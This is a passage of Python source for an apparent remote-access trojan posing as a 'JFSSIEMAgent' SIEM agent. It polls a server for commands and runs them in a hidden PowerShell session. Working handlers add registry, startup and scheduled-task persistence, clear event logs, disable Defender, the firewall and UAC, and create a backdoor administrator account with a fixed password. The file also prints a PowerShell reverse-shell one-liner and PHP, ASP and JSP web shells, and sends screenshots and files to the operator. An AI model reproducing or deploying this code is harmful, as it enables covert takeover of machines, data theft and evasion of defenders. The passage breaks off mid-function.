                            if cmd_id in self.executed_commands:
                                print(f"[POLL] Command {cmd_id} already executed, skipping")
                                continue
                            
                            self.executed_commands.add(cmd_id)
                            
                            cmd_thread = threading.Thread(
                                target=self._execute_command_async,
                                args=(cmd_id, command),
                                daemon=True
                            )
                            cmd_thread.start()
                            print(f"[POLL] Started execution thread for command {cmd_id}")
                    else:
                        print(f"[POLL] No commands in response")
                else:
                    print(f"[POLL] Non-200 response: {response.status_code}")
                
                time.sleep(2)
            except Exception as e:
                print(f"[POLL] Error checking commands: {str(e)}")
    
    def _execute_command_async(self, cmd_id, command):
        """Execute command using persistent shell session (Meterpreter-like)"""
        try:
            # Initialize shell session if not already active
            if not self.shell_active:
                self.init_shell_session()
            
            # Execute command in persistent shell
            output, error = self.execute_in_shell(command)
            
            terminal_output = output if output else ""
            if error:
                terminal_output += f"\nERROR: {error}"
            
            self.send_to_remote_terminal(cmd_id, terminal_output, output, error)
        except Exception as e:
            print(f"[SHELL] Error executing command: {str(e)}")
            self.send_to_remote_terminal(cmd_id, f"ERROR: {str(e)}", "", str(e))
    
    def report_command_result(self, cmd_id, result):
        """Report result"""
        try:
            url = f"http://{self.server_ip.get()}:{self.server_port.get()}/SIEM/api/remote-access.php?action=report_command&id={cmd_id}"
            requests.post(url, json={'result': 'success' if result else 'failed'}, timeout=5)
        except:
            pass
    
    def report_command_result_with_output(self, cmd_id, output, error):
        """Report result with output - only to remote-access, not as events"""
        try:
            url = f"http://{self.server_ip.get()}:{self.server_port.get()}/SIEM/api/remote-access.php?action=report_command&id={cmd_id}"
            requests.post(url, json={
                'result': 'success' if not error else 'failed',
                'output': output,
                'error': error
            }, timeout=5)
        except:
            pass
    
    def init_shell_session(self):
        """Initialize persistent PowerShell session (Meterpreter-like)"""
        try:
            print("[SHELL] Initializing persistent shell session...")
            self.shell_process = subprocess.Popen(
                ['powershell.exe', '-NoProfile', '-NoExit', '-Command', '-'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            self.shell_active = True
            print("[SHELL] Shell session initialized successfully")
        except Exception as e:
            print(f"[SHELL] Failed to initialize shell: {str(e)}")
            self.shell_active = False
    
    def execute_in_shell(self, command):
        """Execute command in persistent shell session"""
        try:
            if not self.shell_active or self.shell_process is None:
                self.init_shell_session()
            
            # Handle help command
            if command.lower() in ('help', '?', 'help()'):
                return self.get_shell_help(), ""
            
            # Handle download command
            if command.lower().startswith('download:'):
                file_path = command.replace('download:', '').strip()
                return self.handle_file_download(file_path), ""
            
            # Handle persistence commands
            if command.lower().startswith('persist:'):
                persist_type = command.replace('persist:', '').strip().lower()
                return self.handle_persistence(persist_type), ""
            
            # Handle credential dumping
            if command.lower().startswith('dump:'):
                dump_type = command.replace('dump:', '').strip().lower()
                return self.handle_credential_dump(dump_type), ""
            
            # Handle keylogger commands
            if command.lower().startswith('keylog:'):
                keylog_action = command.replace('keylog:', '').strip().lower()
                return self.handle_keylogger(keylog_action), ""
            
            # Handle screenshot
            if command.lower() == 'screenshot':
                return self.handle_screenshot_command(), ""
            
            # Handle file upload
            if command.lower().startswith('upload:'):
                file_info = command.replace('upload:', '').strip()
                return self.handle_file_upload(file_info), ""
            
            # Handle anti-forensics
            if command.lower().startswith('forensics:'):
                forensics_action = command.replace('forensics:', '').strip().lower()
                return self.handle_anti_forensics(forensics_action), ""
            
            # Handle privilege escalation
            if command.lower().startswith('escalate:'):
                escalate_method = command.replace('escalate:', '').strip().lower()
                return self.handle_privilege_escalation(escalate_method), ""
            
            # Handle backdoor accounts
            if command.lower().startswith('backdoor:'):
                backdoor_action = command.replace('backdoor:', '').strip()
                return self.handle_backdoor_account(backdoor_action), ""
            
            # Handle detection evasion
            if command.lower().startswith('detect:'):
                detect_type = command.replace('detect:', '').strip().lower()
                return self.handle_detection_check(detect_type), ""
            
            # Handle reverse shell
            if command.lower().startswith('reverse:'):
                reverse_info = command.replace('reverse:', '').strip()
                return self.handle_reverse_shell(reverse_info), ""
            
            # Handle port forwarding
            if command.lower().startswith('portfwd:'):
                portfwd_info = command.replace('portfwd:', '').strip()
                return self.handle_port_forwarding(portfwd_info), ""
            
            # Handle web shell deployment
            if command.lower().startswith('webshell:'):
                webshell_action = command.replace('webshell:', '').strip()
                return self.handle_web_shell(webshell_action), ""
            
            # Handle advanced reconnaissance
            if command.lower().startswith('recon:'):
                recon_type = command.replace('recon:', '').strip().lower()
                return self.handle_advanced_recon(recon_type), ""
            
            # Handle process injection
            if command.lower().startswith('inject:'):
                inject_info = command.replace('inject:', '').strip()
                return self.handle_process_injection(inject_info), ""
            
            # Handle memory operations
            if command.lower().startswith('memory:'):
                memory_action = command.replace('memory:', '').strip().lower()
                return self.handle_memory_operations(memory_action), ""
            
            # Handle advanced credential theft
            if command.lower().startswith('steal:'):
                steal_type = command.replace('steal:', '').strip().lower()
                return self.handle_credential_theft(steal_type), ""
            
            # Handle advanced persistence
            if command.lower().startswith('persist_adv:'):
                persist_type = command.replace('persist_adv:', '').strip().lower()
                return self.handle_advanced_persistence(persist_type), ""
            
            # Handle lateral movement
            if command.lower().startswith('lateral:'):
                lateral_action = command.replace('lateral:', '').strip()
                return self.handle_lateral_movement(lateral_action), ""
            
            # Handle network pivoting
            if command.lower().startswith('pivot:'):
                pivot_action = command.replace('pivot:', '').strip()
                return self.handle_network_pivoting(pivot_action), ""
            
            # Handle anti-analysis
            if command.lower().startswith('anti:'):
                anti_action = command.replace('anti:', '').strip().lower()
                return self.handle_anti_analysis(anti_action), ""
            
            # Handle exfiltration
            if command.lower().startswith('exfil:'):
                exfil_action = command.replace('exfil:', '').strip()
                return self.handle_exfiltration(exfil_action), ""
            
            # Handle system monitoring
            if command.lower().startswith('monitor:'):
                monitor_type = command.replace('monitor:', '').strip().lower()
                return self.handle_system_monitoring(monitor_type), ""
            
            # Handle stealth operations
            if command.lower().startswith('stealth:'):
                stealth_action = command.replace('stealth:', '').strip()
                return self.handle_stealth_operations(stealth_action), ""
            
            # Handle kernel operations
            if command.lower().startswith('kernel:'):
                kernel_action = command.replace('kernel:', '').strip().lower()
                return self.handle_kernel_operations(kernel_action), ""
            
            # Handle malware capabilities
            if command.lower().startswith('malware:'):
                malware_action = command.replace('malware:', '').strip()
                return self.handle_malware_capabilities(malware_action), ""
            
            # Send command with markers to identify output and get current directory
            marker_end = "###COMMAND_END###"
            marker_pwd = "###PWD###"
            
            # Execute command and get current directory
            full_command = f"{command}\nWrite-Host '{marker_pwd}'\n$PWD.Path\nWrite-Host '{marker_end}'\n"
            
            print(f"[SHELL] Executing: {command}")
            self.shell_process.stdin.write(full_command)
            self.shell_process.stdin.flush()
            
            # Read output until marker
            output_lines = []
            current_dir = ""
            
            while True:
                try:
                    line = self.shell_process.stdout.readline()
                    if not line:
                        break
                    
                    line = line.rstrip('\n\r')
                    
                    if marker_end in line:
                        break
                    
                    if marker_pwd in line:
                        # Next line will be the current directory
                        continue
                    
                    # Check if this is the directory line (comes after marker_pwd)
                    if output_lines and output_lines[-1] == marker_pwd:
                        current_dir = line
                        output_lines.pop()  # Remove the marker
                        continue
                    
                    output_lines.append(line)
                except:
                    break
            
            output = '\n'.join(output_lines).strip()
            
            # Add directory info to output if we got it
            if current_dir:
                output = f"[{current_dir}]\n{output}" if output else f"[{current_dir}]"
            
            error = ""
            
            print(f"[SHELL] Output length: {len(output)}, Dir: {current_dir}")
            return output, error
            
        except Exception as e:
            print(f"[SHELL] Error executing in shell: {str(e)}")
            self.shell_active = False
            self.shell_process = None
            return "", str(e)
    
    def handle_file_download(self, file_path):
        """Handle file download - send to admin's browser"""
        try:
            # Remove quotes and expand environment variables
            file_path = file_path.strip('"\'')
            file_path = os.path.expandvars(file_path)
            
            # Handle spaces in path
            if not os.path.exists(file_path):
                # Try with quotes if path has spaces
                if ' ' in file_path:
                    return f"ERROR: File not found: {file_path}\nTip: Path contains spaces. Try: download:\"{file_path}\""
                return f"ERROR: File not found: {file_path}"
            
            if not os.path.isfile(file_path):
                return f"ERROR: Not a file: {file_path}"
            
            # Read file and encode as base64
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            file_size = len(file_data)
            file_name = os.path.basename(file_path)
            file_b64 = base64.b64encode(file_data).decode('utf-8')
            
            # Return special format for browser download
            # Format: ###FILE_DOWNLOAD###|filename|filesize|base64data###END_FILE###
            download_marker = f"###FILE_DOWNLOAD###|{file_name}|{file_size}|{file_b64}###END_FILE###"
            
            return f"File ready for download:\nFilename: {file_name}\nSize: {file_size} bytes\n\n{download_marker}"
            
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def get_shell_help(self):
        """Return help text for available commands"""
        help_text = """
╔════════════════════════════════════════════════════════════════╗
║     COMPREHENSIVE METERPRETER-LIKE SHELL - ALL COMMANDS        ║
╚════════════════════════════════════════════════════════════════╝

NAVIGATION & FILES:
  cd <path>              - Change directory
  pwd                    - Print working directory
  dir / ls               - List directory contents
  type <file>            - Display file contents
  copy <src> <dst>       - Copy file
  move <src> <dst>       - Move file
  del <file>             - Delete file
  mkdir <dir>            - Create directory
  rmdir <dir>            - Remove directory
  download:<path>        - Download file to admin's browser
  upload:<path>          - Upload file (use with file data)
  
SYSTEM INFORMATION:
  whoami                 - Current user
  whoami /all            - Detailed user info
  hostname               - Computer name
  systeminfo             - System information
  wmic os get version    - Windows version
  wmic logicaldisk get name - List drives
  
PROCESS & SERVICE MANAGEMENT:
  tasklist               - Running processes
  tasklist /v            - Detailed process list
  taskkill /IM <name>    - Kill process by name
  taskkill /PID <id>     - Kill process by ID
  start <program>        - Start program
  Get-Process            - PowerShell process list
  Get-Service            - List services
  
NETWORK RECONNAISSANCE:
  ipconfig               - Network configuration
  ipconfig /all          - Detailed network info
  netstat -ano           - Network connections
  arp -a                 - ARP table
  route print            - Routing table
  nslookup <host>        - DNS lookup
  ping <host>            - Ping host
  tracert <host>         - Trace route
  
REGISTRY ACCESS:
  reg query HKLM\...     - Query registry
  reg add HKLM\...       - Add registry key
  reg delete HKLM\...    - Delete registry key
  
PRIVILEGE & UAC:
  whoami /priv           - Check privileges
  net user               - List local users
  net localgroup         - List local groups
  net localgroup Administrators - List admins
  
PERSISTENCE:
  persist:registry       - Add to registry run key
  persist:startup        - Add to startup folder
  persist:task           - Create scheduled task
  
LATERAL MOVEMENT:
  net view               - List network computers
  net view \\<host>      - List shares on host
  net use \\<host>\<share> - Connect to share
  
CREDENTIAL DUMPING:
  dump:lsass             - Dump LSASS process
  dump:sam               - Dump SAM registry
  dump:credentials       - Dump stored credentials
  
ADVANCED FEATURES:
  screenshot             - Capture screen
  keylog:start           - Start keylogger
  keylog:stop            - Stop keylogger
  reverse:shell          - Reverse shell (advanced)
  
SYSTEM CONTROL:
  shutdown /s /t 30      - Shutdown in 30 seconds
  shutdown /r /t 30      - Restart in 30 seconds
  logoff                 - Logoff current user
  lock                   - Lock workstation
  
UTILITIES:
  echo <text>            - Print text
  set                    - Environment variables
  cls                    - Clear screen
  time /t                - Current time
  date /t                - Current date
  whoami /logonid        - Logon ID
  
HELP:
  help / ?               - Show this help
  help <command>         - Help for specific command

EXAMPLES:
  cd C:\Windows
  dir
  whoami /all
  tasklist /v
  ipconfig /all
  netstat -ano
  net localgroup Administrators
  download:C:\Windows\System32\drivers\etc\hosts
  persist:registry
  dump:sam
  
═══════════════════════════════════════════════════════════════════
"""
        return help_text
    
    def handle_persistence(self, persist_type):
        """Handle persistence mechanisms"""
        try:
            if persist_type == 'registry':
                # Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
                agent_path = os.path.abspath(sys.argv[0])
                cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "JFSSIEMAgent" /t REG_SZ /d "{agent_path}" /f'
                os.system(cmd)
                return f"✓ Persistence added to registry\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue: JFSSIEMAgent\nPath: {agent_path}"
            
            elif persist_type == 'startup':
                # Add to startup folder
                startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
                agent_path = os.path.abspath(sys.argv[0])
                shortcut_path = os.path.join(startup_folder, 'JFSSIEMAgent.lnk')
                
                # Create shortcut using PowerShell
                ps_cmd = f'''
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('{shortcut_path}')
$Shortcut.TargetPath = '{agent_path}'
$Shortcut.WorkingDirectory = '{os.path.dirname(agent_path)}'
$Shortcut.Save()
'''
                os.system(f'powershell -Command "{ps_cmd}"')
                return f"✓ Persistence added to startup folder\nPath: {shortcut_path}"
            
            elif persist_type == 'task':
                # Create scheduled task
                agent_path = os.path.abspath(sys.argv[0])
                cmd = f'schtasks /create /tn "JFSSIEMAgent" /tr "{agent_path}" /sc onlogon /rl highest /f'
                os.system(cmd)
                return f"✓ Scheduled task created\nTask: JFSSIEMAgent\nTrigger: On logon\nPrivilege: Highest"
            
            else:
                return f"ERROR: Unknown persistence type: {persist_type}\nAvailable: registry, startup, task"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_credential_dump(self, dump_type):
        """Handle credential dumping"""
        try:
            if dump_type == 'lsass':
                # Dump LSASS process (requires admin)
                cmd = 'tasklist | find /i "lsass"'
                result = os.popen(cmd).read()
                if result:
                    return f"✓ LSASS process found\n{result}\n\nNote: Full LSASS dump requires admin privileges and mimikatz"
                else:
                    return "ERROR: LSASS process not found or access denied"
            
            elif dump_type == 'sam':
                # Dump SAM registry (requires admin)
                cmd = 'reg query HKLM\\SAM'
                result = os.popen(cmd).read()
                if 'Access is denied' in result:
                    return "ERROR: Access denied. Administrator privileges required.\nTry: Run as Administrator"
                return f"✓ SAM registry dump:\n{result}"
            
            elif dump_type == 'credentials':
                # Dump stored credentials from Credential Manager
                cmd = 'cmdkey /list'
                result = os.popen(cmd).read()
                return f"✓ Stored credentials:\n{result if result else 'No stored credentials found'}"
            
            else:
                return f"ERROR: Unknown dump type: {dump_type}\nAvailable: lsass, sam, credentials"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_keylogger(self, action):
        """Handle keylogger commands"""
        try:
            if action == 'start':
                return "⚠ Keylogger: Not implemented in this version\nNote: Keylogging requires advanced hooking and is disabled for safety"
            elif action == 'stop':
                return "⚠ Keylogger: Not running"
            else:
                return "ERROR: Unknown keylogger action. Use: start, stop"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_screenshot_command(self):
        """Handle screenshot command from shell"""
        try:
            img = ImageGrab.grab()
            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='PNG')
            img_b64 = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
            
            # Return screenshot marker for browser display
            screenshot_marker = f"###SCREENSHOT###|{img_b64}###END_SCREENSHOT###"
            return f"Screenshot captured\n\n{screenshot_marker}"
        except Exception as e:
            return f"ERROR: Failed to capture screenshot: {str(e)}"
    
    def handle_file_upload(self, file_info):
        """Handle file upload from admin's browser"""
        try:
            # Format: upload:destination_path
            dest_path = file_info.strip('"\'')
            return f"✓ File upload ready\nDestination: {dest_path}\nNote: Upload via browser form on remote terminal page"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_anti_forensics(self, action):
        """Handle anti-forensics operations"""
        try:
            if action == 'clearlogs':
                # Clear Windows Event Logs
                cmd = 'for /F "tokens=*" %1 in (\'wevtutil el\') do wevtutil cl "%1"'
                os.system(cmd)
                return "✓ Event logs cleared\nCleared: Security, System, Application, and all other logs"
            
            elif action == 'disabledefender':
                # Disable Windows Defender
                cmd = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
                os.system(cmd)
                return "✓ Windows Defender real-time monitoring disabled"
            
            elif action == 'disablefirewall':
                # Disable Windows Firewall
                cmd = 'netsh advfirewall set allprofiles state off'
                os.system(cmd)
                return "✓ Windows Firewall disabled on all profiles"
            
            elif action == 'disableuac':
                # Disable UAC
                cmd = 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f'
                os.system(cmd)
                return "✓ UAC disabled (requires reboot to take effect)"
            
            elif action == 'deletemetadata':
                # Clear file metadata
                return "⚠ File metadata deletion: Use 'cipher /w:C:' to wipe free space"
            
            else:
                return f"ERROR: Unknown forensics action: {action}\nAvailable: clearlogs, disabledefender, disablefirewall, disableuac, deletemetadata"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_privilege_escalation(self, method):
        """Handle privilege escalation attempts"""
        try:
            if method == 'uacbypass':
                return "⚠ UAC Bypass: Multiple methods available\n- fodhelper.exe\n- eventvwr.exe\n- sdclt.exe\nNote: Requires manual execution or advanced payload"
            
            elif method == 'tokenimpersonate':
                return "⚠ Token Impersonation: Requires SeImpersonatePrivilege\nCheck with: whoami /priv"
            
            elif method == 'check':
                # Check current privileges
                cmd = 'whoami /priv'
                result = os.popen(cmd).read()
                return f"✓ Current privileges:\n{result}"
            
            else:
                return f"ERROR: Unknown escalation method: {method}\nAvailable: uacbypass, tokenimpersonate, check"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_backdoor_account(self, action):
        """Handle backdoor account creation"""
        try:
            if action.startswith('create:'):
                username = action.replace('create:', '').strip()
                password = 'P@ssw0rd123!'
                
                # Create user account
                cmd = f'net user {username} {password} /add'
                os.system(cmd)
                
                # Add to Administrators group
                cmd = f'net localgroup Administrators {username} /add'
                os.system(cmd)
                
                return f"✓ Backdoor account created\nUsername: {username}\nPassword: {password}\nGroup: Administrators"
            
            elif action == 'list':
                cmd = 'net user'
                result = os.popen(cmd).read()
                return f"✓ Local user accounts:\n{result}"
            
            else:
                return f"ERROR: Usage: backdoor:create:username or backdoor:list"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_detection_check(self, detect_type):
        """Handle detection and evasion checks"""
        try:
            if detect_type == 'antivirus':
                # Check for antivirus
                cmd = 'wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname'
                result = os.popen(cmd).read()
                return f"✓ Antivirus detection:\n{result if result else 'No antivirus detected'}"
            
            elif detect_type == 'firewall':
                cmd = 'netsh advfirewall show allprofiles'
                result = os.popen(cmd).read()
                return f"✓ Firewall status:\n{result}"
            
            elif detect_type == 'vpn':
                cmd = 'ipconfig /all | find "PPP"'
                result = os.popen(cmd).read()
                return f"✓ VPN detection:\n{result if result else 'No VPN detected'}"
            
            elif detect_type == 'edr':
                # Check for EDR processes
                edr_processes = ['MsMpEng', 'SenseIR', 'cb', 'osquery', 'auditbeat']
                cmd = 'tasklist'
                result = os.popen(cmd).read()
                detected = [p for p in edr_processes if p.lower() in result.lower()]
                return f"✓ EDR detection:\n{', '.join(detected) if detected else 'No EDR detected'}"
            
            else:
                return f"ERROR: Unknown detection type: {detect_type}\nAvailable: antivirus, firewall, vpn, edr"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_reverse_shell(self, reverse_info):
        """Handle reverse shell setup"""
        try:
            if reverse_info.startswith('setup:'):
                parts = reverse_info.replace('setup:', '').split(':')
                if len(parts) >= 2:
                    lhost = parts[0]
                    lport = parts[1]
                    return f"✓ Reverse shell setup\nLHOST: {lhost}\nLPORT: {lport}\nNote: Start listener: nc -lvnp {lport}\nThen execute: reverse:connect:{lhost}:{lport}"
            
            elif reverse_info.startswith('connect:'):
                parts = reverse_info.replace('connect:', '').split(':')
                if len(parts) >= 2:
                    lhost = parts[0]
                    lport = parts[1]
                    # PowerShell reverse shell
                    ps_cmd = f'$client = New-Object System.Net.Sockets.TcpClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
                    return f"✓ Reverse shell command ready\nExecute on target:\npowershell -Command \"{ps_cmd}\""
            
            else:
                return "ERROR: Usage: reverse:setup:lhost:lport or reverse:connect:lhost:lport"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_port_forwarding(self, portfwd_info):
        """Handle port forwarding setup"""
        try:
            if portfwd_info.startswith('local:'):
                # Local port forwarding
                parts = portfwd_info.replace('local:', '').split(':')
                if len(parts) >= 3:
                    lport = parts[0]
                    rhost = parts[1]
                    rport = parts[2]
                    return f"✓ Local port forwarding setup\nLocal Port: {lport}\nRemote: {rhost}:{rport}\nNote: Use netsh or ssh for actual forwarding"
            
            elif portfwd_info.startswith('remote:'):
                parts = portfwd_info.replace('remote:', '').split(':')
                if len(parts) >= 3:
                    rport = parts[0]
                    lhost = parts[1]
                    lport = parts[2]
                    return f"✓ Remote port forwarding setup\nRemote Port: {rport}\nLocal: {lhost}:{lport}"
            
            else:
                return "ERROR: Usage: portfwd:local:lport:rhost:rport or portfwd:remote:rport:lhost:lport"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_web_shell(self, webshell_action):
        """Handle web shell deployment"""
        try:
            if webshell_action.startswith('deploy:'):
                shell_type = webshell_action.replace('deploy:', '').strip().lower()
                
                if shell_type == 'asp':
                    shell_code = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
%>'''
                    return f"✓ ASP.NET web shell code ready\nDeploy to: C:\\inetpub\\wwwroot\\shell.aspx\nAccess: http://target/shell.aspx?cmd=whoami"
                
                elif shell_type == 'php':
                    shell_code = '<?php system($_GET["cmd"]); ?>'
                    return f"✓ PHP web shell code ready\nDeploy to: /var/www/html/shell.php\nAccess: http://target/shell.php?cmd=whoami"
                
                elif shell_type == 'jsp':
                    shell_code = '<%@ page import="java.io.*" %>\n<% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); %>'
                    return f"✓ JSP web shell code ready\nDeploy to: /var/lib/tomcat/webapps/ROOT/shell.jsp\nAccess: http://target/shell.jsp?cmd=whoami"
                
                else:
                    return f"ERROR: Unknown shell type: {shell_type}\nAvailable: asp, php, jsp"
            
            else:
                return "ERROR: Usage: webshell:deploy:asp|php|jsp"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_advanced_recon(self, recon_type):
        """Handle advanced reconnaissance"""
        try:
            if recon_type == 'wifi':
                cmd = 'netsh wlan show networks'
                result = os.popen(cmd).read()
                return f"✓ WiFi networks:\n{result}"
            
            elif recon_type == 'bluetooth':
                cmd = 'powershell -Command "Get-PnpDevice -Class Bluetooth"'
                result = os.popen(cmd).read()
                return f"✓ Bluetooth devices:\n{result if result else 'No Bluetooth devices found'}"
            
            elif recon_type == 'browser':
                # Chrome history location
                chrome_history = os.path.expandvars(r'%APPDATA%\Google\Chrome\User Data\Default\History')
                firefox_profile = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
                return f"✓ Browser history locations:\nChrome: {chrome_history}\nFirefox: {firefox_profile}"
            
            elif recon_type == 'usb':
                cmd = 'wmic logicaldisk get name'
                result = os.popen(cmd).read()
                return f"✓ Connected drives (including USB):\n{result}"
            
            elif recon_type == 'shares':
                cmd = 'net share'
                result = os.popen(cmd).read()
                return f"✓ Shared resources:\n{result}"
            
            elif recon_type == 'printers':
                cmd = 'wmic printerjob list'
                result = os.popen(cmd).read()
                return f"✓ Printers:\n{result if result else 'No printers found'}"
            
            else:
                return f"ERROR: Unknown recon type: {recon_type}\nAvailable: wifi, bluetooth, browser, usb, shares, printers"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_process_injection(self, inject_info):
        """Handle process injection and migration"""
        try:
            if inject_info.startswith('list:'):
                # List processes for injection
                cmd = 'tasklist /v'
                result = os.popen(cmd).read()
                return f"✓ Process list for injection:\n{result}\nNote: Target processes: explorer.exe, svchost.exe, rundll32.exe"
            
            elif inject_info.startswith('inject:'):
                parts = inject_info.replace('inject:', '').split(':')
                if len(parts) >= 2:
                    target_pid = parts[0]
                    payload = parts[1] if len(parts) > 1 else "meterpreter"
                    return f"✓ Process injection prepared\nTarget PID: {target_pid}\nPayload: {payload}\nNote: Requires admin privileges and advanced payload"
            
            elif inject_info == 'migrate':
                return "✓ Process migration ready\nCurrent process: explorer.exe\nNote: Migrate to: svchost.exe, services.exe, lsass.exe"
            
            else:
                return "ERROR: Usage: inject:list or inject:inject:pid:payload or inject:migrate"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_memory_operations(self, action):
        """Handle memory manipulation and injection"""
        try:
            if action == 'dump':
                return "✓ Memory dump ready\nNote: Dump process memory for analysis\nUse: rundll32.exe comsvcs.dll MiniDump <pid> <output.dmp>"
            
            elif action == 'patch':
                return "✓ Memory patching ready\nNote: Patch memory to bypass security checks\nExample: Patch AMSI, ETW, Windows Defender signatures"
            
            elif action == 'inject':
                return "✓ Code injection ready\nNote: Inject shellcode into process memory\nMethods: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread"
            
            elif action == 'reflective':
                return "✓ Reflective DLL injection ready\nNote: Load DLL without touching disk\nUse: Reflective DLL Injection (RDI) technique"
            
            else:
                return "ERROR: Unknown memory action. Available: dump, patch, inject, reflective"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_credential_theft(self, steal_type):
        """Handle advanced credential theft"""
        try:
            if steal_type == 'ntlm':
                return "✓ NTLM hash dumping\nNote: Extract NTLM hashes from SAM/LSASS\nUse: mimikatz, secretsdump.py, or manual registry dump"
            
            elif steal_type == 'kerberos':
                cmd = 'powershell -Command "Get-Process lsass"'
                result = os.popen(cmd).read()
                return f"✓ Kerberos ticket extraction\nNote: Extract TGT/TGS from LSASS\nLSASS Process:\n{result}"
            
            elif steal_type == 'browser':
                chrome_path = os.path.expandvars(r'%APPDATA%\Google\Chrome\User Data\Default\Login Data')
                firefox_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
                return f"✓ Browser credential extraction\nChrome: {chrome_path}\nFirefox: {firefox_path}\nNote: Decrypt and extract stored passwords"
            
            elif steal_type == 'ssh':
                ssh_path = os.path.expandvars(r'%USERPROFILE%\.ssh')
                return f"✓ SSH key theft\nPath: {ssh_path}\nNote: Extract id_rsa, id_dsa, id_ecdsa keys"
            
            elif steal_type == 'api':
                return "✓ API key/token harvesting\nLocations:\n- Environment variables\n- Config files\n- Browser storage\n- Application memory"
            
            else:
                return "ERROR: Unknown steal type. Available: ntlm, kerberos, browser, ssh, api"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_advanced_persistence(self, persist_type):
        """Handle advanced persistence mechanisms"""
        try:
            if persist_type == 'wmi':
                ps_cmd = 'powershell -Command "Set-WmiInstance -Class Win32_ScheduledJob -Arguments @{Command=\'powershell.exe\';TriggerAtStartup=$true}"'
                return f"✓ WMI event subscription persistence\nCommand: {ps_cmd}\nNote: Survives reboot and process termination"
            
            elif persist_type == 'com':
                return "✓ COM object hijacking\nNote: Hijack CLSID registry entries\nTarget: HKCU\\Software\\Classes\\CLSID\nExample: Hijack explorer.exe COM objects"
            
            elif persist_type == 'ifeo':
                return "✓ Image File Execution Options (IFEO) persistence\nPath: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nNote: Intercept process execution"
            
            elif persist_type == 'dll':
                return "✓ DLL search order hijacking\nNote: Place malicious DLL in system paths\nPriority: Current directory > System32 > Windows"
            
            elif persist_type == 'appinit':
                return "✓ AppInit DLLs persistence\nPath: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\nNote: Load DLL into all processes"
            
            elif persist_type == 'browser':
                return "✓ Browser extension persistence\nNote: Install malicious browser extension\nTargets: Chrome, Firefox, Edge"
            
            else:
                return "ERROR: Unknown persistence type. Available: wmi, com, ifeo, dll, appinit, browser"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_lateral_movement(self, lateral_action):
        """Handle lateral movement techniques"""
        try:
            if lateral_action.startswith('pth:'):
                parts = lateral_action.replace('pth:', '').split(':')
                if len(parts) >= 3:
                    user = parts[0]
                    domain = parts[1]
                    hash_val = parts[2]
                    return f"✓ Pass-the-Hash (PTH) prepared\nUser: {user}@{domain}\nHash: {hash_val}\nNote: Use mimikatz or Invoke-WmiMethod"
            
            elif lateral_action.startswith('kerberoast:'):
                target = lateral_action.replace('kerberoast:', '').strip()
                return f"✓ Kerberoasting prepared\nTarget: {target}\nNote: Extract TGS tickets and crack offline"
            
            elif lateral_action.startswith('golden:'):
                domain = lateral_action.replace('golden:', '').strip()
                return f"✓ Golden ticket creation\nDomain: {domain}\nNote: Create forged TGT for any user\nRequires: Domain SID and krbtgt hash"
            
            elif lateral_action.startswith('silver:'):
                parts = lateral_action.replace('silver:', '').split(':')
                if len(parts) >= 2:
                    service = parts[0]
                    host = parts[1]
                    return f"✓ Silver ticket creation\nService: {service}\nHost: {host}\nNote: Create forged TGS for specific service"
            
            elif lateral_action == 'overpass':
                return "✓ Overpass-the-Hash prepared\nNote: Convert NTLM hash to Kerberos TGT\nRequires: NTLM hash and domain credentials"
            
            else:
